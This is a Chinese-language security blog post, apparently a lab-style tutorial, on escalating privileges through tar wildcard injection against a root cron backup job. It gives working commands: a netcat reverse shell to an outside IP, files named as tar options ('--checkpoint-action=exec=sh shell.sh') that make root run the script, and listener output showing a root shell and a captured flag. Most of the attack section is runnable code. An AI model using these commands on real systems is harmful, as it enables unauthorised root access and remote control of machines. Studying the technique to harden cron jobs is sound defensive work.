#  【tips】基于tar通配符漏洞的提权方法   
原创 BeretSec  贝雷帽SEC   2024-02-28 22:07  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
**Tips +1**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
  
**提权原理**  
  
tar有通配符*的漏洞，tar用通配符来压缩文件并读取文件名，若是目录下存在有参数则将执行。  
  
**操作过程**  
  
1、使用root用户创建一个任务计划**，**  
root用户每隔1分钟执行一次tar打包命令备份/opt/secret目录  
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *    * * *   root    cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cro
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cro
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cro
```  
  
2、使用普通用户在secret 目录下执行如下命令  
```
创建一个reverse shell脚本
echo "nc 192.168.1.103 9090 -e /bin/bash" >shell.sh
chmod +x shell.sh

创建tar将要运行的参数
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```  
  
  
**3、接受shell**  
```
┌──(root㉿kali)-[~]
└─# nc -lvvp 9090                   
listening on [any] 9090 ...
connect to [192.168.1.103] from hostname [192.168.1.154] 33600
id 
uid=0(root) gid=0(root) groups=0(root)
whoami
root
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@hostname:/opt/secret# cd /root
cd /root
root@hostname:~# ls
ls
root.txt
root@hostname:~# cat root.txt
cat root.txt
d5806296126a30ceebeaa172ff9c9151
root@hostname:~# 
 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCCPssf7tfibcKibdGEAYAKdhZJwfFWwPF3V62Xiah5xbvUAFwhl9ED9TkDeWaYFwgly5Qq9bckwgm7Rg/640?wx_fmt=png&from=appmsg "")  
  
                                        
  
End  
  
  
“点赞、在看与分享都是莫大的支持”  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCDACJgvibBSia6MChia78vgBGURXW2Sq5o3uZTdw9oeR6yn90jH0BZrS0pl9ibYXicoDSXU8YkRQ49FjCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pM2klgicgT5dylTzXyrXBmex6dlAsZ0QJOQdzqcw2HpC49rnL0dTHNsWsOze4QmRYN7fPRoLdVK5MXs0DXtOvZw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
